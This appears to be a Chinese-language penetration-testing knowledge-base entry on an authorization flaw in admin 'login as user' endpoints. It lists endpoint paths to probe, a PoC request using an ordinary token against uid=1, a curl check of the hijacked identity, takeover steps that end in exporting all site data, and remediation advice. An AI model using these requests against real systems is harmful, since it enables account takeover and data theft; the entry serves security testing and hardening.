---
title: 后台"切换用户/代登录"接口越权（任意账号接管）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 自研客服/代理后台
versions: 任意
ports: 80, 443
keywords: impersonate, switch, 代登录, 客服, 越权, 接管
entry: /api/admin/user/loginAs?uid=1
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

- 后台常见"以该用户身份登录""代客操作"按钮，对应接口：

```
/api/admin/user/loginAs?uid=       /api/admin/member/switch?memberId=
/api/cs/impersonate                /api/agent/loginAs?uid=
```

## 前置条件

- 任意账号（普通会员 token 或低权客服/代理）。

## PoC

```http
### 1) 用普通 token 调代登录
GET /api/admin/user/loginAs?uid=1 HTTP/1.1
Authorization: Bearer <普通 token>

# 200 且返回 {"token":"..."} / {"sessionId":"..."} ⇒ 直接拿目标账号
```

```bash
# 拿到 token 后验证身份
curl -s https://target/api/user/info -H "Authorization: Bearer <返回的 token>"
```

## 利用步骤

1. 从 JS/后台页面找"代登录"接口路径，换成普通 token 打。
2. `uid=1` 常是管理员/总代；返回 token 即接管。
3. 若无 token 返回，看是否 Set-Cookie（换会话）；也有的返回跳转 URL 带票据。
4. 接管后看资金/资料面；管理员账号可再改审核状态、导出全站数据。
5. 证据：一条 200 的代登录请求 + 用返回 token 读 info；只测自己 uid 与 1。

## 修复与缓解

- 代登录需强角色（超管）+ 双人审批 + 全程审计；token 短时效且标记 `impersonated`。
- 普通角色完全禁止；接口按 uid 做行级鉴权。

## 参考

- OWASP API Security Top 10：API5 BFLA。
